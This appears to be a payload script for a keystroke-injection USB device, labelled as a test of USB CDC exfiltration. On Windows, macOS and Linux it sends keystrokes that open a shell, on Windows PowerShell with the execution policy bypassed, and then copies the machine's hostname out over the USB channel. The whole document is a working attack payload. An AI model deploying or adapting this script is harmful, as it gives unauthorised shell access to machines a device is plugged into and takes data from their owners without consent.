NAME USB Exfil Test
DESCRIPTION Tests USB CDC exfiltration by capturing hostname
CATEGORY recon
PLATFORMS WIN,MAC,LINUX
OPTION DELAY 2000 "Initial HID enumeration delay (ms)"
OPTION EXFIL_USB_DELAY 3000 "Delay before USB CDC switch (ms)"
PLATFORM WIN
DELAY {{DELAY}}
SET EXFIL_USB_DELAY {{EXFIL_USB_DELAY}}
GUI r
DELAY 800
STRING powershell -nop -ep bypass
ENTER
DELAY 1200
EXFIL_USB hostname
PLATFORM MAC
DELAY {{DELAY}}
SET EXFIL_USB_DELAY {{EXFIL_USB_DELAY}}
GUI SPACE
DELAY 700
STRING Terminal
ENTER
DELAY 1400
EXFIL_USB hostname
PLATFORM LINUX
DELAY {{DELAY}}
SET EXFIL_USB_DELAY {{EXFIL_USB_DELAY}}
CTRL ALT t
DELAY 1400
EXFIL_USB hostname
